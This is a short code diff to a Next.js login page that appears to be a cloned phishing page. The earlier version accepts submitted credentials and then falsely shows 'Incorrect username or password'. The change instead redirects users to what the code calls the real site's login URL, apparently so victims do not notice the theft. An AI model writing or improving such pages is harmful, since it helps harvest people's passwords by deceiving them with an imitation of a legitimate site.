@@ -5,7 +5,7 @@ import Link from "next/link";
 import SiteLayout from "@/components/SiteLayout";
 import Breadcrumb from "@/components/Breadcrumb";
 import { SITE } from "@/lib/data";
-import { ROUTES } from "@/lib/routes";
+import { ROUTES, REAL_SITE_URLS } from "@/lib/routes";
 
 export default function LoginPage() {
   const [username, setUsername] = useState("");
@@ -26,15 +26,13 @@ export default function LoginPage() {
         body: JSON.stringify({ username, password, remember }),
       });
 
+      const data = await res.json();
+
       if (!res.ok) {
-        const data = await res.json();
         throw new Error(data.error || "Login failed");
       }
 
-      setError(
-        "ERROR: Incorrect username or password. Please try again or reset your password."
-      );
-      setPassword("");
+      window.location.href = data.redirect || REAL_SITE_URLS.pmsLogin;
     } catch (err) {
       setError(err instanceof Error ? err.message : "An error occurred");
     } finally {
